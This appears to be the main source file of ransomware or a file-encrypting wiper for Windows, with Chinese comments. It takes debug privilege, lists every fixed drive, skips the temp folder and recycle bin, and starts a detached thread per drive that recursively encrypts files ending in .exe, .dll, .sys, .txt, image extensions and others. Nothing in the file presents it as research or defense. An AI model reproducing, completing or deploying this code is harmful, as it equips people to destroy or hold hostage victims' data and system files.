#define _CRT_SECURE_NO_WARNINGS
#include "entrypt_file.h"
#include "utils.h"

#include<iostream>
#include<windows.h>
#include<vector>
#include<thread>
#include<atomic>


using namespace std;


// 记录磁盘数
atomic_uint32_t harddriver_count;

// 存储盘名  ，如 "C:\" "D:\"
vector<wstring> harddriver_name;

vector<wstring> kExcludeDir;
vector<wstring> kIncludeBackfix{L".exe", L".dll", L".png", L".jpg",
                                L".bmp", L".txt", L".ini",  L".sys"};

int main() {

  WCHAR rootPath[10] = {0}, driveType[MAX_PATH] = {0};
  UINT nType;

  locale::global(locale(""));

  // Remote Debugger
  //getchar();

  HANDLE hToken;
  BOOL bRet = OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
  SetPrivilege(hToken, SE_DEBUG_NAME, TRUE);

  for (char a = 'A'; a <= 'Z'; a++) {
    wsprintf(rootPath, L"%c:\\", a);
    nType = GetDriveTypeW(rootPath);
    if (nType != DRIVE_NO_ROOT_DIR)  // DRIVE_NO_ROOT_DIR: 路径无效
    {
      if (nType == DRIVE_FIXED) {
        harddriver_count++;
        harddriver_name.push_back(rootPath);
      }
    }
  }

  WCHAR TempPath[MAX_PATH+1]{};
  GetTempPathW(sizeof(TempPath),TempPath);
  kExcludeDir.push_back(TempPath);
  
  for (auto driver : harddriver_name) {
    kExcludeDir.push_back(driver.append(L"$Recycle.Bin"));
  }

  #ifdef _DEBUG
  for (auto dir : kExcludeDir) {
    printf("%ws\n", dir.c_str());
  }
#endif  // _DEBUG

  printf("-----------------------------------------------\n");

  // 多线程加密
  vector<wstring>::const_iterator begin = harddriver_name.cbegin();
  while (begin != harddriver_name.cend()) {
    thread t1(encrypt_file_recursive, *begin, true);
    t1.detach();
    begin++;
  }

  // 主线程要等所有std::thread::detach 
  // 不然可能会出gs failure
  while (harddriver_count) {
    Sleep(1);
  }
  return 0;
}

